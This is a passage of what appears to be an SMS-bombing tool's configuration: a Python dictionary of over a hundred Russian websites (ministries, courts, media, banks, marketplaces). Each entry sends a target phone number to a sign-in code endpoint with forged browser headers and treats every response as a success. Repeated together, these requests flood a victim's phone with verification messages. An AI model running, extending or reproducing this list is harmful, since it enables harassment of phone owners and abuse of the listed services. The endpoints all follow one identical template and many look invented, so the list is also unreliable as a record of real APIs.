        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1178": {
        "name": "PFR",
        "url": "https://pfr.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pfr.gov.ru/", "https://pfr.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1179": {
        "name": "FSS",
        "url": "https://fss.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fss.ru/", "https://fss.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1180": {
        "name": "FSSP",
        "url": "https://fssp.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fssp.gov.ru/", "https://fssp.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1181": {
        "name": "MVD",
        "url": "https://mvd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mvd.ru/", "https://mvd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1182": {
        "name": "MCHS",
        "url": "https://mchs.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mchs.gov.ru/", "https://mchs.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1183": {
        "name": "Minzdrav",
        "url": "https://minzdrav.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minzdrav.gov.ru/", "https://minzdrav.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1184": {
        "name": "Rosminzdrav",
        "url": "https://rosminzdrav.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosminzdrav.ru/", "https://rosminzdrav.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1185": {
        "name": "Rospotrebnadzor",
        "url": "https://rospotrebnadzor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rospotrebnadzor.ru/", "https://rospotrebnadzor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1186": {
        "name": "Roskomnadzor",
        "url": "https://rkn.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rkn.gov.ru/", "https://rkn.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1187": {
        "name": "Genproc",
        "url": "https://genproc.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://genproc.gov.ru/", "https://genproc.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1188": {
        "name": "SUD",
        "url": "https://sudrf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sudrf.ru/", "https://sudrf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1189": {
        "name": "Arbitr",
        "url": "https://arbitr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://arbitr.ru/", "https://arbitr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1190": {
        "name": "Notary",
        "url": "https://notariat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://notariat.ru/", "https://notariat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1191": {
        "name": "Advokat",
        "url": "https://fparf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fparf.ru/", "https://fparf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1192": {
        "name": "BankiRu",
        "url": "https://banki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://banki.ru/", "https://banki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1193": {
        "name": "Sravni",
        "url": "https://sravni.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sravni.ru/", "https://sravni.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1194": {
        "name": "VBR",
        "url": "https://vbr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vbr.ru/", "https://vbr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1195": {
        "name": "Chelyabinsk",
        "url": "https://chelyabinsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chelyabinsk.ru/", "https://chelyabinsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1196": {
        "name": "E1Ru",
        "url": "https://e1.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://e1.ru/", "https://e1.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1197": {
        "name": "НГС",
        "url": "https://ngs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ngs.ru/", "https://ngs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1198": {
        "name": "Fontanka",
        "url": "https://fontanka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fontanka.ru/", "https://fontanka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1199": {
        "name": "Gorod55",
        "url": "https://gorod55.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gorod55.ru/", "https://gorod55.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1200": {
        "name": "Krasnoyarsk",
        "url": "https://ngs24.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ngs24.ru/", "https://ngs24.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1201": {
        "name": "Ufa1",
        "url": "https://ufa1.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ufa1.ru/", "https://ufa1.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1202": {
        "name": "NNRu",
        "url": "https://nn.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nn.ru/", "https://nn.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1203": {
        "name": "SuperOmsk",
        "url": "https://superomsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://superomsk.ru/", "https://superomsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1204": {
        "name": "TaygaInfo",
        "url": "https://tayga.info/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tayga.info/", "https://tayga.info", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1205": {
        "name": "Znak",
        "url": "https://znak.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://znak.com/", "https://znak.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1206": {
        "name": "Meduza",
        "url": "https://meduza.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://meduza.io/", "https://meduza.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1207": {
        "name": "Vedomosti",
        "url": "https://vedomosti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vedomosti.ru/", "https://vedomosti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1208": {
        "name": "Kommersant",
        "url": "https://kommersant.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kommersant.ru/", "https://kommersant.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1209": {
        "name": "RBC",
        "url": "https://rbc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rbc.ru/", "https://rbc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1210": {
        "name": "TАСС",
        "url": "https://tass.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tass.ru/", "https://tass.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1211": {
        "name": "RIA",
        "url": "https://ria.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ria.ru/", "https://ria.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1212": {
        "name": "Interfax",
        "url": "https://interfax.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://interfax.ru/", "https://interfax.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1213": {
        "name": "Regnum",
        "url": "https://regnum.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://regnum.ru/", "https://regnum.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1214": {
        "name": "Izvestia",
        "url": "https://iz.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://iz.ru/", "https://iz.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1215": {
        "name": "RG",
        "url": "https://rg.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rg.ru/", "https://rg.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1216": {
        "name": "KomsomolskayaPravda",
        "url": "https://kp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kp.ru/", "https://kp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1217": {
        "name": "MoskovskijKomsomolets",
        "url": "https://mk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mk.ru/", "https://mk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1218": {
        "name": "ArgumentyFakty",
        "url": "https://aif.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aif.ru/", "https://aif.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1219": {
        "name": "LentaRu",
        "url": "https://lenta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.ru/", "https://lenta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1220": {
        "name": "GazetaRu",
        "url": "https://gazeta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gazeta.ru/", "https://gazeta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1221": {
        "name": "LifeRu",
        "url": "https://life.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://life.ru/", "https://life.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1222": {
        "name": "Moslenta",
        "url": "https://moslenta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://moslenta.ru/", "https://moslenta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1223": {
        "name": "Ridus",
        "url": "https://ridus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ridus.ru/", "https://ridus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1224": {
        "name": "Svpressa",
        "url": "https://svpressa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://svpressa.ru/", "https://svpressa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1225": {
        "name": "FreePress",
        "url": "https://freepress.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://freepress.ru/", "https://freepress.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1226": {
        "name": "Tsargrad",
        "url": "https://tsargrad.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tsargrad.tv/", "https://tsargrad.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1227": {
        "name": "Zvezda",
        "url": "https://tvzvezda.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tvzvezda.ru/", "https://tvzvezda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1228": {
        "name": "RENTV",
        "url": "https://ren.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ren.tv/", "https://ren.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1229": {
        "name": "PiterTV",
        "url": "https://piter.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://piter.tv/", "https://piter.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1230": {
        "name": "ChannelOne",
        "url": "https://1tv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://1tv.ru/", "https://1tv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1231": {
        "name": "Russia1",
        "url": "https://russia.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://russia.tv/", "https://russia.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1232": {
        "name": "NTVRu",
        "url": "https://ntv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ntv.ru/", "https://ntv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1233": {
        "name": "CTC",
        "url": "https://ctc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ctc.ru/", "https://ctc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1234": {
        "name": "TNT",
        "url": "https://tnt-online.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tnt-online.ru/", "https://tnt-online.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1235": {
        "name": "Pyatnitsa",
        "url": "https://pyatnitsa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pyatnitsa.ru/", "https://pyatnitsa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1236": {
        "name": "SpasTV",
        "url": "https://spastv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spastv.ru/", "https://spastv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1237": {
        "name": "Domashny",
        "url": "https://domashny.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domashny.ru/", "https://domashny.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1238": {
        "name": "CheTV",
        "url": "https://chetv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chetv.ru/", "https://chetv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1239": {
        "name": "Subbota",
        "url": "https://subbota.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://subbota.tv/", "https://subbota.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1240": {
        "name": "YuTV",
        "url": "https://u-tv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://u-tv.ru/", "https://u-tv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1241": {
        "name": "Zagorodny",
        "url": "https://zagorodny.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zagorodny.tv/", "https://zagorodny.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1242": {
        "name": "OhototaRy",
        "url": "https://ohototary.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ohototary.ru/", "https://ohototary.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1243": {
        "name": "Usadba",
        "url": "https://usadba.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://usadba.tv/", "https://usadba.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1244": {
        "name": "Drayv",
        "url": "https://drayv.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://drayv.tv/", "https://drayv.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1245": {
        "name": "Viju",
        "url": "https://viju.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://viju.ru/", "https://viju.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1246": {
        "name": "SonyChannel",
        "url": "https://sonychannel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sonychannel.ru/", "https://sonychannel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1247": {
        "name": "FoxRu",
        "url": "https://foxtv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://foxtv.ru/", "https://foxtv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1248": {
        "name": "NationalGeographic",
        "url": "https://natgeotv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://natgeotv.ru/", "https://natgeotv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1249": {
        "name": "DiscoveryRu",
        "url": "https://discoverychannel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://discoverychannel.ru/", "https://discoverychannel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1250": {
        "name": "AnimalPlanet",
        "url": "https://animalplanet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://animalplanet.ru/", "https://animalplanet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1251": {
        "name": "EurosportRu",
        "url": "https://eurosport.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eurosport.ru/", "https://eurosport.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1252": {
        "name": "ViasatSport",
        "url": "https://viasatsport.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://viasatsport.ru/", "https://viasatsport.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1253": {
        "name": "KHL",
        "url": "https://khl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khl.ru/", "https://khl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1254": {
        "name": "RPL",
        "url": "https://premierliga.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://premierliga.ru/", "https://premierliga.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1255": {
        "name": "RFS",
        "url": "https://rfs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rfs.ru/", "https://rfs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1256": {
        "name": "FHR",
        "url": "https://fhr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fhr.ru/", "https://fhr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1257": {
        "name": "ROC",
        "url": "https://olympic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://olympic.ru/", "https://olympic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1258": {
        "name": "Sportbox",
        "url": "https://sportbox.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sportbox.ru/", "https://sportbox.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1259": {
        "name": "VestiRu",
        "url": "https://vesti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vesti.ru/", "https://vesti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1260": {
        "name": "Smotrim",
        "url": "https://smotrim.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://smotrim.ru/", "https://smotrim.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1261": {
        "name": "Rutube",
        "url": "https://rutube.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rutube.ru/", "https://rutube.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1262": {
        "name": "VKontakte",
        "url": "https://vk.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vk.com/", "https://vk.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1263": {
        "name": "Odnoklassniki",
        "url": "https://ok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ok.ru/", "https://ok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1264": {
        "name": "MailRu",
        "url": "https://mail.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mail.ru/", "https://mail.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1265": {
        "name": "YandexRu",
        "url": "https://yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yandex.ru/", "https://yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1266": {
        "name": "RamblerRu",
        "url": "https://rambler.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rambler.ru/", "https://rambler.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1267": {
        "name": "SberDevices",
        "url": "https://sberdevices.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberdevices.ru/", "https://sberdevices.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1268": {
        "name": "SberPrime",
        "url": "https://sberprime.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberprime.ru/", "https://sberprime.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1269": {
        "name": "SberHealth",
        "url": "https://sberhealth.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberhealth.ru/", "https://sberhealth.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1270": {
        "name": "SberAuto",
        "url": "https://sberauto.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberauto.com/", "https://sberauto.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1271": {
        "name": "SberCloud",
        "url": "https://sbercloud.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbercloud.ru/", "https://sbercloud.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1272": {
        "name": "SberInsurance",
        "url": "https://sins.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sins.ru/", "https://sins.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1273": {
        "name": "SberLeasing",
        "url": "https://sberlease.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberlease.ru/", "https://sberlease.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1274": {
        "name": "SberLogistics",
        "url": "https://sberlogistics.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberlogistics.ru/", "https://sberlogistics.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1275": {
        "name": "SberMegaMarket",
        "url": "https://sbermegamarket.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbermegamarket.ru/", "https://sbermegamarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1276": {
        "name": "Megamarket",
        "url": "https://megamarket.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megamarket.ru/", "https://megamarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1277": {
        "name": "YandexMarket",
        "url": "https://market.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://market.yandex.ru/", "https://market.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1278": {
        "name": "Ozon",
        "url": "https://ozon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ozon.ru/", "https://ozon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1279": {
        "name": "Wildberries",
        "url": "https://wildberries.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wildberries.ru/", "https://wildberries.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1280": {
        "name": "AliExpressRu",
        "url": "https://aliexpress.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aliexpress.ru/", "https://aliexpress.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1281": {
        "name": "KazanExpress",
        "url": "https://kazanexpress.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kazanexpress.ru/", "https://kazanexpress.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1282": {
        "name": "MagnitMarket",
        "url": "https://mm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mm.ru/", "https://mm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1283": {
        "name": "Lamoda",
        "url": "https://lamoda.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lamoda.ru/", "https://lamoda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1284": {
        "name": " ДетскийМир",
        "url": "https://detmir.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://detmir.ru/", "https://detmir.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1285": {
        "name": "SportMaster",
        "url": "https://sportmaster.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sportmaster.ru/", "https://sportmaster.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1286": {
        "name": "DecathlonRu",
        "url": "https://decathlon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://decathlon.ru/", "https://decathlon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1287": {
        "name": "InTheSale",
        "url": "https://intheskate.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://intheskate.ru/", "https://intheskate.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1288": {
        "name": "MVideo",
        "url": "https://mvideo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mvideo.ru/", "https://mvideo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1289": {
        "name": "Eldorado",
        "url": "https://eldorado.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eldorado.ru/", "https://eldorado.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1290": {
        "name": "DNS",
        "url": "https://dns-shop.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dns-shop.ru/", "https://dns-shop.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1291": {
